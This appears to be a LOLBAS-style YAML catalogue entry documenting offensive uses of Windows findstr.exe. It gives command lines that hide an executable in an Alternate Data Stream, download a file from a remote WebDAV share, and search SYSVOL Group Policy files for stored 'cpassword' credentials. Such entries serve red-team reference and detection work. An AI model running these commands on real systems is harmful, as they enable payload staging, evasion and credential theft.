---
name: Findstr.exe
description: 
functions:
  ads:
    - description: Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.
      code: findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe
    - description: Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.
      code: findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe
  credentials:
    - description: Search for stored password in Group Policy files stored on SYSVOL.
      code: findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
  download:
    - description: Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is downloaded to the target file.
      code: findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.exe
resources: 
    - resource: https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
    - resource: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
fullpath: 
    - path: c:\windows\system32\findstr.exe
    - path: c:\windows\sysWOW64\findstr.exe
notes: Thanks to Oddvar Moe - @oddvarmoe
---